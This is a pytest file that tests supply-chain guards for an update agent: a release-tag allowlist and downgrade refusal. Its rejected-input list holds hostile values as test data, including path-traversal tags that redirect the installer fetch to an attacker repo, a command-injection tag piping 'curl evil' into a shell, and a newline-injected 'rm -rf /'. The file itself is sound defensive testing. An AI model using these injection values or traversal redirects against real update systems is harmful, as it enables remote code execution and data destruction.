"""OTA supply-chain guards: installer-tag allowlist + downgrade refusal.

Threat model: `update_target_tag` comes FROM THE BACKEND and is interpolated into
the installer URL, and the downloaded script is executed. So a backend compromise
— or one compromised admin account, since the tag is set when an admin clicks
"Update" — must not be able to redirect the fetch or roll the fleet backwards.

Both guards live on the node on purpose: a compromised backend cannot relax a
check it does not control.
"""
from __future__ import annotations

import pytest

from meshembed_node import worker

pytestmark = pytest.mark.unit


# --- tag allowlist -----------------------------------------------------------

@pytest.mark.parametrize("tag", ["v0.3.41", "v1.0.0", "v10.20.30", " v0.3.41 "])
def test_accepts_well_formed_release_tags(tag):
    assert worker._validate_installer_tag(tag) == tag.strip()


@pytest.mark.parametrize("tag", [
    # THE attack: normalises to raw.githubusercontent.com/attacker/evil/...
    "../../../../attacker/evil-repo/refs/heads/main",
    "v0.3.41/../../../../attacker/evil/refs/heads/main",
    "..%2f..%2fattacker%2fevil",
    "https://evil.example.com/install.sh",
    "main",                    # branch, not a release
    "latest",
    "v0.3",                    # incomplete
    "0.3.41",                  # missing the v
    "v0.3.41; curl evil|sh",   # shell metacharacters
    "v0.3.41\nrm -rf /",       # newline injection
    "",
    None,
])
def test_rejects_traversal_urls_branches_and_injection(tag):
    with pytest.raises(RuntimeError, match="unsafe_installer_tag"):
        worker._validate_installer_tag(tag)


def test_traversal_payload_would_have_hit_a_different_repo():
    """Documents precisely why this matters: the crafted tag resolves to an
    attacker-controlled URL once dot-segments are normalised."""
    from urllib.parse import urljoin
    evil = "../../../../attacker/evil-repo/refs/heads/main"
    url = (f"https://raw.githubusercontent.com/Clusterhive-io/"
           f"meshembed-node-agent/refs/tags/{evil}/install.sh")
    normalised = urljoin(url, "")
    assert "attacker/evil-repo" in normalised      # the redirect is real
    with pytest.raises(RuntimeError):              # and we now block it
        worker._validate_installer_tag(evil)


# --- version parsing / downgrade refusal -------------------------------------

@pytest.mark.parametrize("raw,expected", [
    ("v0.3.41", (0, 3, 41)), ("0.3.41", (0, 3, 41)),
    ("v1.0.0", (1, 0, 0)), ("0.3.40+local", (0, 3, 40)),
    ("v0.3", (0, 3, 0)), ("garbage", (0, 0, 0)),
])
def test_version_tuple(raw, expected):
    assert worker._version_tuple(raw) == expected


def test_downgrade_is_refused(monkeypatch):
    monkeypatch.setattr(worker, "__version__", "0.3.40", raising=False)
    monkeypatch.setitem(__import__("sys").modules, "meshembed_node", worker)
    import meshembed_node
    monkeypatch.setattr(meshembed_node, "__version__", "0.3.40", raising=False)
    monkeypatch.delenv("MESHEMBED_ALLOW_DOWNGRADE", raising=False)
    with pytest.raises(RuntimeError, match="downgrade_refused"):
        worker._reject_downgrade("v0.3.10")


def test_upgrade_and_reinstall_are_allowed(monkeypatch):
    import meshembed_node
    monkeypatch.setattr(meshembed_node, "__version__", "0.3.40", raising=False)
    monkeypatch.delenv("MESHEMBED_ALLOW_DOWNGRADE", raising=False)
    worker._reject_downgrade("v0.3.41")   # upgrade
    worker._reject_downgrade("v0.3.40")   # same version / repair


def test_downgrade_override_lets_operators_roll_back(monkeypatch):
    import meshembed_node
    monkeypatch.setattr(meshembed_node, "__version__", "0.3.40", raising=False)
    monkeypatch.setenv("MESHEMBED_ALLOW_DOWNGRADE", "1")
    worker._reject_downgrade("v0.3.10")   # deliberate rollback is still possible
